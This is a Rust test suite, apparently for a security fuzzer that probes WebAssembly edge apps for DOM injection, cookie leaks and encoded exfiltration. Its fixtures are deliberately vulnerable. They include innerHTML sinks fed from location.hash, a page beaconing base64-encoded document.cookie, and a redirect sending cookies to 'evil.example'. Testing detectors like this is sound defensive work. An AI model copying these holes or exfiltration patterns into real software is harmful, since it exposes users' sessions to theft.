                (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
                (func (export "run") (param i32 i32) (result i32)
                    (i32.store (i32.const 0) (i32.const 64))
                    (i32.store (i32.const 4) (i32.const {length})) (i32.const 0)))"#,
                length = page.len()
            ),
        )
    };
    std::fs::write(f.dir.join("app.wasm"), build(page)).unwrap();
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert_eq!(out["status"], "complete", "{out}");
    let leak = out["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "encoded_flow").unwrap_or_else(|| panic!("{out}"));
    assert_eq!(leak["severity"], "fail", "{leak}");
    let (_, explained) = f.cli(&["explain", leak["run"].as_str().unwrap()]);
    let evidence = explained["findings"].as_array().unwrap().iter().find(|f| f["id"] == leak["id"]).unwrap();
    assert_eq!(evidence["detail"]["encoding"], "base64", "{evidence}");
    let (_, browser) = f.cli(&["show", evidence["detail"]["browser_run"].as_str().unwrap()]);
    let beacon = browser["events"].as_array().unwrap().iter().find(|e| e["func"] == "appfuzz:browser/net#fetch-other").unwrap();
    assert_eq!(beacon["args"]["kind"], "beacon", "{beacon}");
    assert!(!appfuzz_core::value::some(&beacon["args"]["body"]).and_then(Value::as_str).unwrap().contains("sk_"), "{beacon}");
    let (_, confirmed) = f.cli(&["confirm", leak["id"].as_str().unwrap(), "--max-runs", "4"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
    std::fs::write(f.dir.join("app.wasm"), build(&page.replace("btoa(document.cookie)", "'public message'"))).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false, "{replayed}");
    let (_, fixed) = f.cli(&["probe", "scripts"]);
    assert_eq!(fixed["status"], "complete", "{fixed}");
    assert!(fixed["findings"].as_array().unwrap().iter().all(|f| f["kind"] != "encoded_flow"), "{fixed}");
    let (_, browser) = f.cli(&["show", fixed["pages"][0]["browser_run"].as_str().unwrap()]);
    assert!(
        browser["events"].as_array().unwrap().iter().any(|e| e["func"] == "appfuzz:browser/net#fetch-other"
            && appfuzz_core::value::some(&e["args"]["body"]).and_then(Value::as_str) == Some("public message")),
        "{browser}"
    );
}

fn browser_post_echo_fixture(sink: &str) -> Vec<u8> {
    let page = format!(
        "<!doctype html><p id=g></p><script>fetch('/api',{{method:'POST',body:decodeURIComponent(location.hash.slice(1))}}).then(r=>r.text()).then(t=>document.getElementById('g').{sink}=t)</script>"
    );
    let escaped = page.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
    wat::parse_str(format!(
        r#"(module
        (import "fastly_http_req" "body_downstream_get" (func $request (param i32 i32) (result i32)))
        (import "fastly_http_req" "uri_get" (func $uri (param i32 i32 i32 i32) (result i32)))
        (import "fastly_http_resp" "new" (func $new (param i32) (result i32)))
        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
        (import "fastly_http_body" "read" (func $read (param i32 i32 i32 i32) (result i32)))
        (memory (export "memory") 1)
        (data (i32.const 512) "{escaped}")
        (func (export "_start")
            (drop (call $request (i32.const 0) (i32.const 4)))
            (drop (call $uri (i32.load (i32.const 0)) (i32.const 8192) (i32.const 1024) (i32.const 16)))
            (drop (call $new (i32.const 8))) (drop (call $body (i32.const 12)))
            (if (i32.eq (i32.load (i32.const 16)) (i32.const 23))
                (then
                    (drop (call $read (i32.load (i32.const 4)) (i32.const 9408) (i32.const 1024) (i32.const 20)))
                    (drop (call $write (i32.load (i32.const 12)) (i32.const 9408) (i32.load (i32.const 20)) (i32.const 0) (i32.const 24))))
                (else
                    (drop (call $write (i32.load (i32.const 12)) (i32.const 512) (i32.const {length}) (i32.const 0) (i32.const 24)))))
            (drop (call $send (i32.load (i32.const 8)) (i32.load (i32.const 12)) (i32.const 0)))))"#,
        length = page.len()
    ))
    .unwrap()
}

#[test]
fn browser_post_body_flows_through_the_real_app_and_dom_finding_replays() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
    std::fs::write(f.dir.join("app.wasm"), browser_post_echo_fixture("innerHTML")).unwrap();
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert_eq!(out["status"], "complete", "{out}");
    let finding = out["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "4"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
    std::fs::write(f.dir.join("app.wasm"), browser_post_echo_fixture("textContent")).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false, "{replayed}");
    let (_, api) = f.cli(&["show", "last"]);
    assert_eq!(api["spec"]["args"][0]["method"], "POST", "{api}");
    assert!(api["spec"]["args"][0]["body"].as_str().is_some_and(|s| !s.is_empty()), "{api}");
    assert_eq!(api["result"]["body"], api["spec"]["args"][0]["body"], "{api}");
}

#[test]
fn browser_probe_executes_script_sent_before_a_child_crash() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
    let page = "<p id=g></p><script src='/app.js'></script>";
    let script = "document.getElementById('g').innerHTML=decodeURIComponent(location.hash.slice(1))";
    let esc = |text: &str| text.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
    let bytes = wat::parse_str(format!(
        r#"(module
        (import "fastly_http_req" "body_downstream_get" (func $request (param i32 i32) (result i32)))
        (import "fastly_http_req" "uri_get" (func $uri (param i32 i32 i32 i32) (result i32)))
        (import "fastly_http_resp" "new" (func $new (param i32) (result i32)))
        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
        (memory (export "memory") 1)
        (data (i32.const 64) "{}") (data (i32.const 2048) "{}")
        (func (export "_start") (local $js i32)
            (drop (call $request (i32.const 16) (i32.const 20)))
            (drop (call $uri (i32.load (i32.const 16)) (i32.const 512) (i32.const 1024) (i32.const 32)))
            (local.set $js (i32.eq (i32.load (i32.const 32)) (i32.const 26)))
            (drop (call $new (i32.const 0))) (drop (call $body (i32.const 4)))
            (if (local.get $js)
                (then (drop (call $write (i32.load (i32.const 4)) (i32.const 2048) (i32.const {}) (i32.const 0) (i32.const 8))))
                (else (drop (call $write (i32.load (i32.const 4)) (i32.const 64) (i32.const {}) (i32.const 0) (i32.const 8)))))
            (drop (call $send (i32.load (i32.const 0)) (i32.load (i32.const 4)) (i32.const 0)))
            (if (local.get $js) (then unreachable))))"#,
        esc(page),
        esc(script),
        script.len(),
        page.len()
    ))
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (_, child) = f.cli(&["run", "--set", r#"{"uri":"https://app.example/app.js"}"#]);
    assert_eq!(child["outcome"]["kind"], "unreachable", "{child}");
    assert_eq!(child["result"]["body"], script);
    let (_, out) = f.cli(&["probe", "scripts"]);
    let finding = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
}

#[test]
fn browser_probe_execution_errors_make_review_incomplete() {
    let f = Fixture::new(true);
    let page = "<script>document.title='ok'</script>";
    f.edit("\"safe\"", &toml::Value::String(page.into()).to_string());
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    let (code, out) = f.cli(&["probe", "scripts", "--now", "1900-01-01T00:00:00"]);
    assert!(out["pages"].as_array().is_some_and(|ps| ps.iter().any(|p| p["outcome"] == "plan_error")), "{out}");
    assert_eq!(code, 3, "{out}");
    assert_eq!(out["status"], "incomplete", "{out}");
    assert!(out["errors"].as_array().is_some_and(|e| !e.is_empty()), "{out}");
    let (code, review) = f.cli(&["review", "--runs", "1", "--time", "1ms", "--now", "1900-01-01T00:00:00"]);
    assert_eq!(code, 3, "{review}");
    assert_eq!(review["status"], "incomplete", "{review}");
    assert_eq!(review["verdict"], "incomplete", "{review}");
}

#[test]
fn browser_probe_request_errors_do_not_pass_as_inapplicable() {
    let f = Fixture::new(true);
    for args in ["[]", "[{}]"] {
        let (code, out) = f.cli(&["probe", "scripts", "--args", args]);
        assert_eq!(code, 3, "{out}");
        assert!(out["error"].is_string(), "{out}");
        assert!(out.get("note").is_none(), "{out}");
    }
    // A valid response without script behavior remains an ordinary skip.
    let (code, out) = f.cli(&["probe", "scripts"]);
    assert_eq!(code, 0, "{out}");
    assert_eq!(out["status"], "complete");
    assert!(out["pages"].as_array().unwrap().is_empty());
    assert!(out["note"].is_string());
}

#[test]
fn browser_probe_missing_session_reports_are_incomplete() {
    let f = Fixture::new(true);
    let page = "<script>globalThis.__af.report=()=>''</script>";
    f.edit("\"safe\"", &toml::Value::String(page.into()).to_string());
    let (code, out) = f.cli(&["probe", "scripts"]);
    assert_eq!(code, 3, "{out}");
    assert_eq!(out["status"], "incomplete");
    assert!(out["pages"].as_array().is_some_and(|ps| ps.iter().all(|p| p["outcome"] == "ok")));
    assert!(out["errors"].as_array().is_some_and(|es| es.iter().all(|e| e.as_str().unwrap().contains("no complete session report"))));
}

fn authenticated_browser_fixture(response_cookie: bool) -> Fixture {
    authenticated_browser_fixture_with_sink(response_cookie, "innerHTML")
}
fn authenticated_browser_fixture_with_sink(response_cookie: bool, sink: &str) -> Fixture {
    let f = Fixture::new(false);
    let headers = if response_cookie { json!([]) } else { json!([["Cookie", "sid=real"]]) };
    let request = json!({"method":"GET","uri":"https://app.example/","headers":headers,"body":""});
    std::fs::write(
        &f.manifest,
        format!("[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nrequest={}\nresult={{body='html:scripts'}}\n", toml::Value::try_from(request).unwrap()),
    )
    .unwrap();
    let page = "<!doctype html><html><head></head><body><p id=c></p><script>fetch('/api').then(r=>r.ok?r.text():null).then(v=>{if(v!==null)document.getElementById('c').innerHTML=v+decodeURIComponent(location.hash.slice(1));})</script></body></html>".replace("innerHTML", sink);
    let esc = |s: &str| s.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
    let set_cookie =
        if response_cookie { "(drop (call $header (i32.load (i32.const 8)) (i32.const 48) (i32.const 10) (i32.const 64) (i32.const 26)))" } else { "" };
    let bytes = wat::parse_str(format!(
        r#"(module
        (import "fastly_http_req" "body_downstream_get" (func $request (param i32 i32) (result i32)))
        (import "fastly_http_req" "uri_get" (func $uri (param i32 i32 i32 i32) (result i32)))
        (import "fastly_http_req" "header_value_get" (func $cookie (param i32 i32 i32 i32 i32 i32) (result i32)))
        (import "fastly_http_resp" "new" (func $new (param i32) (result i32)))
        (import "fastly_http_resp" "header_insert" (func $header (param i32 i32 i32 i32 i32) (result i32)))
        (import "fastly_http_resp" "status_set" (func $status (param i32 i32) (result i32)))
        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
        (memory (export "memory") 1)
        (data (i32.const 32) "cookie") (data (i32.const 48) "set-cookie")
        (data (i32.const 64) "sid=real; HttpOnly; Path=/")
        (data (i32.const 512) "{}") (data (i32.const 4096) "ok") (data (i32.const 4112) "denied")
        (func (export "_start") (local $i i32) (local $authed i32)
            (drop (call $request (i32.const 0) (i32.const 4)))
            (drop (call $uri (i32.load (i32.const 0)) (i32.const 8192) (i32.const 1024) (i32.const 16)))
            (drop (call $new (i32.const 8))) (drop (call $body (i32.const 12)))
            (if (i32.eq (i32.load (i32.const 16)) (i32.const 23))
                (then
                    (drop (call $cookie (i32.load (i32.const 0)) (i32.const 32) (i32.const 6) (i32.const 9408) (i32.const 1024) (i32.const 20)))
                    (block $done (loop $scan
                        (br_if $done (i32.gt_u (i32.add (local.get $i) (i32.const 8)) (i32.load (i32.const 20))))
                        (if (i64.eq (i64.load (i32.add (i32.const 9408) (local.get $i))) (i64.const {}))
                            (then (local.set $authed (i32.const 1)) (br $done)))
                        (local.set $i (i32.add (local.get $i) (i32.const 1))) (br $scan)))
                    (if (local.get $authed)
                        (then (drop (call $write (i32.load (i32.const 12)) (i32.const 4096) (i32.const 2) (i32.const 0) (i32.const 24))))
                        (else
                            (drop (call $status (i32.load (i32.const 8)) (i32.const 401)))
                            (drop (call $write (i32.load (i32.const 12)) (i32.const 4112) (i32.const 6) (i32.const 0) (i32.const 24))))))
                (else
                    {set_cookie}
                    (drop (call $write (i32.load (i32.const 12)) (i32.const 512) (i32.const {}) (i32.const 0) (i32.const 24)))))
            (drop (call $send (i32.load (i32.const 8)) (i32.load (i32.const 12)) (i32.const 0)))))"#,
        esc(&page),
        u64::from_le_bytes(*b"sid=real"),
        page.len()
    ))
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    f
}
fn assert_authenticated_browser_is_checked(f: &Fixture, response_cookie: bool) {
    let (_, out) = f.cli(&["probe", "scripts"]);
    let finding = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    let fixed = authenticated_browser_fixture_with_sink(response_cookie, "textContent");
    std::fs::copy(fixed.dir.join("app.wasm"), f.dir.join("app.wasm")).unwrap();
    let (code, regression) = f.cli(&["replay", confirmed["case"].as_str().unwrap(), "--against-current"]);
    assert_eq!(code, 0, "{regression}");
    assert_eq!(regression["reproduced"], false, "{regression}");
    let (_, api) = f.cli(&["show", "last"]);
    assert_eq!(api["result"]["status"], 200, "{api}");
    assert_eq!(api["result"]["body"], "ok", "{api}");
}
#[test]
fn browser_cookie_from_the_page_request_authenticates_api_requests() {
    assert_authenticated_browser_is_checked(&authenticated_browser_fixture(false), false);
}
#[test]
fn browser_cookie_set_by_the_page_authenticates_api_requests() {
    assert_authenticated_browser_is_checked(&authenticated_browser_fixture(true), true);
}

enum CookieReply {
    Ok,
    Echo,
    Redirect(&'static str),
}
fn browser_cookie_log_fixture(leak: bool, reply: CookieReply) -> Vec<u8> {
    let mut source = include_str!("fixtures/browser_cookie_log.wat").to_string();
    if !leak {
        source = source.replace("(call $log ", "(call $no_log ");
    }
    if matches!(reply, CookieReply::Echo) {
        source = source.replace("(i32.const 4096) (i32.const 2)", "(i32.const 9408) (i32.load (i32.const 20))");
    }
    if let CookieReply::Redirect(target) = reply {
        let encoded = target.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
        source = source.replace(
            "(func $no_log",
            r#"(import "fastly_http_resp" "header_insert" (func $header (param i32 i32 i32 i32 i32) (result i32)))
(import "fastly_http_resp" "status_set" (func $status (param i32 i32) (result i32)))
(func $no_log"#,
        );
        source = source.replace(
            "(memory (export \"memory\") 1)",
            &format!("(memory (export \"memory\") 1) (data (i32.const 128) \"{encoded}\") (data (i32.const 256) \"location\")"),
        );
        let redirect = format!(
            r#"
            (memory.copy (i32.const 12000) (i32.const 128) (i32.const {n}))
            (memory.copy (i32.const {tail}) (i32.const 9408) (i32.load (i32.const 20)))
            (drop (call $header (i32.load (i32.const 8)) (i32.const 256) (i32.const 8) (i32.const 12000) (i32.add (i32.const {n}) (i32.load (i32.const 20)))))
            (drop (call $status (i32.load (i32.const 8)) (i32.const 302)))
        "#,
            n = target.len(),
            tail = 12000 + target.len()
        );
        source = source.replace(
            "(drop (call $write (i32.load (i32.const 12)) (i32.const 4096)",
            &(redirect + "(drop (call $write (i32.load (i32.const 12)) (i32.const 4096)"),
        );
    }
    wat::parse_str(source).unwrap()
}
#[test]
fn browser_cookie_secrets_logged_by_api_requests_confirm_replay_and_regress() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
    std::fs::write(f.dir.join("app.wasm"), browser_cookie_log_fixture(true, CookieReply::Ok)).unwrap();
    let (_, out) = f.cli(&["probe", "scripts"]);
    let leak = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "secret_leak").unwrap_or_else(|| panic!("{out}"));
    let (_, explained) = f.cli(&["explain", leak["run"].as_str().unwrap()]);
    let shown = explained["findings"].as_array().unwrap().iter().find(|v| v["id"] == leak["id"]).unwrap();
    let nested = shown["detail"]["nested_run"].as_str().unwrap();
    let (_, api) = f.cli(&["show", nested]);
    assert!(api["stdout"].as_str().unwrap().contains("af_session=sk_"), "{api}");
    let (_, confirmed) = f.cli(&["confirm", leak["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), browser_cookie_log_fixture(false, CookieReply::Ok)).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
    let (_, api) = f.cli(&["show", "last"]);
    assert_eq!(api["result"]["status"], 200, "{api}");
}

#[test]
fn encoded_browser_cookies_in_api_logs_confirm_replay_and_regress() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
    let source = include_str!("fixtures/browser_cookie_log.wat").replace("(call $log ", "(call $log_hex ");
    let source = source.replace("(func $no_log", &format!("{}\n(func $no_log", include_str!("fixtures/browser_cookie_hex_log.wat")));
    std::fs::write(f.dir.join("app.wasm"), wat::parse_str(source).unwrap()).unwrap();
    let (_, out) = f.cli(&["probe", "scripts"]);
    let leak = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "encoded_flow").unwrap_or_else(|| panic!("{out}"));
    assert_eq!(leak["severity"], "fail", "{leak}");
    let (_, explained) = f.cli(&["explain", leak["run"].as_str().unwrap()]);
    let shown = explained["findings"].as_array().unwrap().iter().find(|v| v["id"] == leak["id"]).unwrap();
    assert_eq!(shown["detail"]["encoding"], "hex", "{shown}");
    let nested = shown["detail"]["nested_run"].as_str().unwrap();
    let (_, api) = f.cli(&["show", nested]);
    let cookie = api["spec"]["args"][0]["headers"].as_array().unwrap().iter().find(|h| h[0] == "cookie").unwrap()[1].as_str().unwrap();
    let encoded: String = cookie.bytes().map(|b| format!("{b:02x}")).collect();
    assert_eq!(api["stdout"], encoded, "{api}");
    let (_, confirmed) = f.cli(&["confirm", leak["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), browser_cookie_log_fixture(false, CookieReply::Ok)).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false, "{replayed}");
    let (_, api) = f.cli(&["show", "last"]);
    assert_eq!(api["result"]["status"], 200, "{api}");
}

#[test]
fn returning_the_callers_cookie_to_that_caller_is_not_a_new_leak() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
    std::fs::write(f.dir.join("app.wasm"), browser_cookie_log_fixture(false, CookieReply::Echo)).unwrap();
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert_eq!(out["status"], "complete", "{out}");
    assert!(out["findings"].as_array().unwrap().iter().all(|f| f["kind"] != "secret_leak"), "{out}");
}

#[test]
fn api_redirects_may_return_cookies_to_the_owner_but_not_to_another_origin() {
    for (url, leaks) in [("/next?cookie=", false), ("https://evil.example/next?cookie=", true)] {
        let f = Fixture::new(false);
        std::fs::write(&f.manifest,"[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n[grants]\nhosts=['evil.example']\nwasi=['wasi_snapshot_preview1']\n").unwrap();
        std::fs::write(f.dir.join("app.wasm"), browser_cookie_log_fixture(false, CookieReply::Redirect(url))).unwrap();
        let (_, out) = f.cli(&["probe", "scripts"]);
        assert_eq!(out["status"], "complete", "{out}");
        assert_eq!(out["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "secret_leak"), leaks, "{out}");
    }
}
